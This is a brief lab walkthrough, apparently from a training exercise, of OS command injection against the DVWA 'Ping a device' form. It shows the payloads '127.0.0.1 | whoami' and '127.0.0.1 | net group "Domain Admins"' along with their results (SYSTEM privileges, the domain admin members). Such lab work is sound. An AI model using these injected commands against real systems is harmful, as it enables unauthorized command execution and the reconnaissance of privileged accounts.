# Command Injection Scenario – Part 2: Attacker

**Target:** DVWA on `sadeg.com` (Windows Server, Apache)
**Technique:** OS Command Injection (MITRE T1059)

## 1. Login to DVWA

![Login page](images/7.png)

## 2. Home Page

![DVWA home page](images/8.png)

## 3. Open Command Injection Module

The "Ping a device" form passes the IP address directly to the OS `ping` command.

![Command Injection page](images/9.png)

## 4. Test Injection – whoami

Input: `127.0.0.1 | whoami`

![Typing whoami payload](images/10.png)

Result: the command runs as **nt authority\system**, confirming the injection works with high privileges.

![whoami result](images/11.png)

## 5. Enumerate Domain Admins

Input: `127.0.0.1 | net group "Domain Admins"`

![Typing net group payload](images/12.png)

Result: command executed successfully, returning the Domain Admins group members (`Administrator`, `svc_backup`).

![net group result](images/13.png)

## Summary

| Step | Payload | Result |
|---|---|---|
| 1 | `127.0.0.1 \| whoami` | nt authority\system |
| 2 | `127.0.0.1 \| net group "Domain Admins"` | Group members disclosed |
